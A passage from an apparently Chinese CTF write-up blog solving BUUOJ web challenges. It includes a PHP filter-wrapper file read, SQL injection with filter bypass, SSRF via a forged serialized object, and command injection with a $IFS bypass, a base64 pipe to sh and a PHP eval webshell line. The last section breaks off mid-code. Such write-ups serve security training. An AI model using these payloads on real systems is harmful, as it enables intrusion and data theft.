title=\"Havefun\"></a>Havefun</h3><p>查看源码发现</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$cat=$_GET[<span class=\"string\">'cat'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $cat;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($cat==<span class=\"string\">'dog'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>GET</code>传参</p>\n<h3 id=\"Secret-File\"><a href=\"#Secret-File\" class=\"headerlink\" title=\"Secret File\"></a>Secret File</h3><p><strong>F12</strong>打开开发者工具，监视网络，发现在连续的三个页面中间有一个302跳转，我们抓包之后发现跳转页面的注释中给了一个文件名 <code>secr3t.php</code> ,访问得到代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">    $file=$_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($file,<span class=\"string\">\"../\"</span>)||stristr($file, <span class=\"string\">\"tp\"</span>)||stristr($file,<span class=\"string\">\"input\"</span>)||stristr($file,<span class=\"string\">\"data\"</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Oh no!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file); </span><br><span class=\"line\"><span class=\"comment\">//flag放在了flag.php里</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>php 伪协议读文件之后再解码即可：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网鼎杯-Fakebook\"><a href=\"#网鼎杯-Fakebook\" class=\"headerlink\" title=\"网鼎杯-Fakebook\"></a>网鼎杯-Fakebook</h3><p>扫目录得到 robots.txt </p>\n<p><code>/user.php.bak</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看起来像 SSRF ，又有序列化。</p>\n<h4 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h4><p><code>Join</code> 页面 <code>sqlmap</code> 试出来 <code>username</code> 有 POST 注入，存的数据是序列化之后的用户信息。</p>\n<p>注册登录之后查看 BLOG 内容页面发现 <code>no</code> 参数可能存在注入：</p>\n<p><code>http://buuoj.cn/view.php?no=1 and 1=1#</code></p>\n<p><code>正常</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 and 1=2#</code></p>\n<p><code>报错 Notice: Trying to get property of non-object in /var/www/html/view.php on line 53</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 order by 5#</code></p>\n<p><code>*] query error! (Unknown column &#39;5&#39; in &#39;order clause&#39;)</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1 union select 1,2,3,4#</code></p>\n<p><code>有过滤：no hack ~_~</code></p>\n<p><code>.node3.buuoj.cn/view.php?no=-1 union/**/select 1,2,3,4#</code></p>\n<p><code>找到回显位在 2</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(schema_name),3,4 from information_schema.schemata--+</code></p>\n<p><code>fakebook,information_schema,mysql,performance_schema,test</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;--+</code></p>\n<p><code>users</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>\n<p><code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(data,username,passwd),3,4 from users--+</code></p>\n<p><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;goya&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;}goyaed12c3322e527f073f9159f257dfcc7db08c86ec11388c76b6c5009b06aa33ecd6bfab7d74151ba3f0c50ef1938c03134762c9e435cc88db39c53114ed2a2b14</code></p>\n<p>序列化存储 <code>data</code></p>\n<p>结合上面的代码我们可以知道下面的代码即可读取 flag ：</p>\n<p><code>?no=0 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p>\n<p>顺便读一下 <code>view.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php session_start(); ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;db.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;user.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;error.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$db = new DB();</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;ko&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot;</span><br><span class=\"line\">          content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;User&lt;/title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;?php require_once &apos;bootstrap.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$no = $_GET[&apos;no&apos;];</span><br><span class=\"line\">if ($db-&gt;anti_sqli($no))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    die(&quot;no hack ~_~&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$res = $db-&gt;getUserByNo($no);</span><br><span class=\"line\">$user = unserialize($res[&apos;data&apos;]);</span><br><span class=\"line\">//print_r($res);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;table class=&quot;table&quot;&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                username</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                age</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                blog</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $res[&apos;username&apos;]; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $user-&gt;age; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo xss($user-&gt;blog); ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">    &lt;/table&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">    $response = $user-&gt;getBlogContents();</span><br><span class=\"line\">    if ($response === 404)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &quot;404 Not found&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $base64 = base64_encode($response);</span><br><span class=\"line\">        echo &quot;&lt;iframe width=&apos;100%&apos; height=&apos;10em&apos; src=&apos;data:text/html;base64,&#123;$base64&#125;&apos;&gt;&quot;;</span><br><span class=\"line\">        // echo $response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // var_dump($user-&gt;getBlogContents());</span><br><span class=\"line\">    ?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>db.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &apos;lib.php&apos;;</span><br><span class=\"line\">$mysqli = new mysqli(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;naiwjebfahjebfja&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">class DB &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction __construct() &#123;</span><br><span class=\"line\">\t\t// $mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;!@#1234!@#&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function isValidUsername($username) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res-&gt;fetch_array()) &#123;</span><br><span class=\"line\">\t\t\treturn 1;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction login($username, $passwd) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos; and passwd = &apos;&#123;$passwd&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_array();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction insertUser($username, $passwd, $data) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = substr($username, 0, 100);</span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$data = serialize($data);</span><br><span class=\"line\">\t\t$data = addslashes($data);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;insert into users (username, passwd, data) values (&apos;&#123;$username&#125;&apos;, &apos;&#123;$passwd&#125;&apos;, &apos;&#123;$data&#125;&apos;)&quot;;</span><br><span class=\"line\">\t\treturn $mysqli-&gt;real_query($query);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getAllUsers() &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;select * from users&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\treturn $res-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getUserByNo($no) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// $no = addslashes($no);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where no = &#123;$no&#125;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res) &#123;</span><br><span class=\"line\">\t\t\techo &quot;&lt;p&gt;[*] query error! (&#123;$mysqli-&gt;error&#125;)&lt;/p&gt;&quot;;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_assoc();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function anti_sqli($no) &#123;</span><br><span class=\"line\">\t\t$patterns = &quot;/union\\Wselect|0x|hex/i&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn preg_match($patterns, $no);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\">CREATE TABLE `users` ( `no` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(100) NOT NULL , `passwd` VARCHAR(128) NOT NULL , `data` TEXT NOT NULL , PRIMARY KEY (`no`)) ENGINE = MyISAM;</span><br><span class=\"line\"></span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Ping-Ping-Ping\"><a href=\"#Ping-Ping-Ping\" class=\"headerlink\" title=\"Ping Ping Ping\"></a>Ping Ping Ping</h3><h4 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h4><p>先测试什么能用</p>\n<p>过滤<code>&#39; 、&quot; 、 {}、空格、[]、*、?</code>、/</p>\n<p>绕过空格可以 <code>${IFS},$IFS,</code></p>\n<p>这里 <code>$IFS</code> 绕过空格</p>\n<p><code>127.0.0.1;ls$IFS-l</code> 看到 flag.php。 尝试读 <code>127.0.0.1;cat$IFSflag.php</code>,过滤了 <code>flag</code> 关键字，尝试传马</p>\n<p> <code>;echo -e &quot;&lt;?php @eval(\\$_POST[122]);?&gt;&quot; &gt; 233.php</code> </p>\n<p>但是因为过滤了引号，也失败了。现在只能尝试构造关键字 flag 。</p>\n<p>尝试内联执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;a=f;b=ag;c=l;cat$IFS$a$c$b.php</span><br></pre></td></tr></table></figure>\n\n<p>这里需要注意定义变量的顺序 <code>acd</code> 就会被检测出含有 flag。</p>\n<p>执行完查看源代码即可。</p>\n<p>还可以编码绕过：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh ==&gt; cat flag.php</span><br></pre></td></tr></table></figure>\n\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/silence1_/article/details/96135760\" target=\"_blank\" rel=\"noopener\">命令注入绕过</a></p>\n<h3 id=\"SSRFME\"><a href=\"#SSRFME\" class=\"headerlink\" title=\"SSRFME\"></a>SSRFME</h3><p>源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span 